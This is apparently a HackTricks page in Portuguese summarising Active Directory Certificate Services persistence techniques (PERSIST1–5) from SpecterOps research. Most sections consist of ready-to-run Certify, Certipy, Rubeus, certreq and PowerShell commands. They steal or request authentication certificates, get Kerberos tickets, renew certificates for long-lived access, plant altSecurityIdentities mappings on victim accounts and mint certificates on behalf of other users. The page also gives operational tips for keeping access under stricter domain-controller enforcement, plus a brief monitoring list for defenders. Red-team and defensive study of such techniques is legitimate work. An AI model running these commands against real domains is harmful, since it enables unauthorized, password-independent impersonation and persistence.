# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Este é um pequeno resumo dos capítulos de persistência de conta da pesquisa incrível de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Entendendo o Roubo de Credenciais de Usuário Ativo com Certificados – PERSIST1

Em um cenário onde um certificado que permite a autenticação de domínio pode ser solicitado por um usuário, um atacante tem a oportunidade de solicitar e roubar esse certificado para manter a persistência em uma rede. Por padrão, o template `User` no Active Directory permite tais solicitações, embora às vezes possa estar desativado.

Usando [Certify](https://github.com/GhostPack/Certify) ou [Certipy](https://github.com/ly4k/Certipy), você pode procurar por templates habilitados que permitem autenticação de cliente e então solicitar um:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
O poder de um certificado reside em sua capacidade de autenticar como o usuário a que pertence, independentemente de alterações de senha, desde que o certificado permaneça válido.

Você pode converter PEM para PFX e usá-lo para obter um TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Combinado com outras técnicas (veja as seções de THEFT), a autenticação baseada em certificado permite acesso persistente sem tocar no LSASS e mesmo a partir de contextos não elevados.

## Obtendo Persistência de Máquina com Certificados - PERSIST2

Se um atacante tiver privilégios elevados em um host, ele pode inscrever a conta de máquina do sistema comprometido para um certificado usando o modelo padrão `Machine`. Autenticar-se como a máquina habilita S4U2Self para serviços locais e pode fornecer persistência durável do host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

Abusar dos períodos de validade e renovação de modelos de certificado permite que um atacante mantenha acesso a longo prazo. Se você possui um certificado emitido anteriormente e sua chave privada, pode renová-lo antes da expiração para obter uma nova credencial de longa duração sem deixar artefatos de solicitação adicionais vinculados ao principal original.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Dica operacional: Acompanhe os prazos de validade dos arquivos PFX mantidos pelo atacante e renove-os antecipadamente. A renovação também pode fazer com que os certificados atualizados incluam a extensão de mapeamento SID moderno, mantendo-os utilizáveis sob regras de mapeamento DC mais rigorosas (veja a próxima seção).

## Plantando Mapeamentos de Certificado Explícitos (altSecurityIdentities) – PERSIST4

Se você puder escrever no atributo `altSecurityIdentities` de uma conta alvo, poderá mapear explicitamente um certificado controlado pelo atacante a essa conta. Isso persiste através de mudanças de senha e, ao usar formatos de mapeamento fortes, permanece funcional sob a aplicação moderna do DC.

Fluxo de alto nível:

1. Obtenha ou emita um certificado de autenticação de cliente que você controla (por exemplo, inscreva-se no template `User` como você mesmo).
2. Extraia um identificador forte do certificado (Issuer+Serial, SKI ou SHA1-PublicKey).
3. Adicione um mapeamento explícito no `altSecurityIdentities` do principal da vítima usando esse identificador.
4. Autentique-se com seu certificado; o DC o mapeia para a vítima através do mapeamento explícito.

Exemplo (PowerShell) usando um mapeamento forte de Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Em seguida, autentique-se com seu PFX. Certipy obterá um TGT diretamente:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notas
- Use apenas tipos de mapeamento fortes: X509IssuerSerialNumber, X509SKI ou X509SHA1PublicKey. Formatos fracos (Subject/Issuer, apenas Subject, e-mail RFC822) estão obsoletos e podem ser bloqueados pela política do DC.
- A cadeia de certificados deve ser construída até uma raiz confiável pelo DC. CAs empresariais no NTAuth são tipicamente confiáveis; alguns ambientes também confiam em CAs públicas.

Para mais informações sobre mapeamentos explícitos fracos e caminhos de ataque, veja:

{{#ref}}
domain-escalation.md
{{#endref}}

## Agente de Inscrição como Persistência – PERSIST5

Se você obtiver um certificado válido de Agente de Solicitação de Certificado/Agente de Inscrição, poderá criar novos certificados com capacidade de logon em nome dos usuários à vontade e manter o PFX do agente offline como um token de persistência. Fluxo de abuso:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Revogação do certificado do agente ou permissões do modelo é necessária para expulsar essa persistência.

## 2025 Aplicação Rigorosa de Mapeamento de Certificados: Impacto na Persistência

O Microsoft KB5014754 introduziu a Aplicação Rigorosa de Mapeamento de Certificados em controladores de domínio. Desde 11 de fevereiro de 2025, os DCs padrão para Aplicação Total, rejeitando mapeamentos fracos/ambíguos. Implicações práticas:

- Certificados anteriores a 2022 que não possuem a extensão de mapeamento SID podem falhar no mapeamento implícito quando os DCs estão em Aplicação Total. Os atacantes podem manter o acesso renovando certificados através do AD CS (para obter a extensão SID) ou plantando um mapeamento explícito forte em `altSecurityIdentities` (PERSIST4).
- Mapeamentos explícitos usando formatos fortes (Issuer+Serial, SKI, SHA1-PublicKey) continuam a funcionar. Formatos fracos (Issuer/Subject, Subject-only, RFC822) podem ser bloqueados e devem ser evitados para persistência.

Os administradores devem monitorar e alertar sobre:
- Mudanças em `altSecurityIdentities` e emissão/renovações de certificados de Agente de Inscrição e Usuário.
- Logs de emissão de CA para solicitações em nome de e padrões de renovação incomuns.

## Referências

- Microsoft. KB5014754: Mudanças na autenticação baseada em certificado em controladores de domínio do Windows (cronograma de aplicação e mapeamentos fortes).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Referência de Comando (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
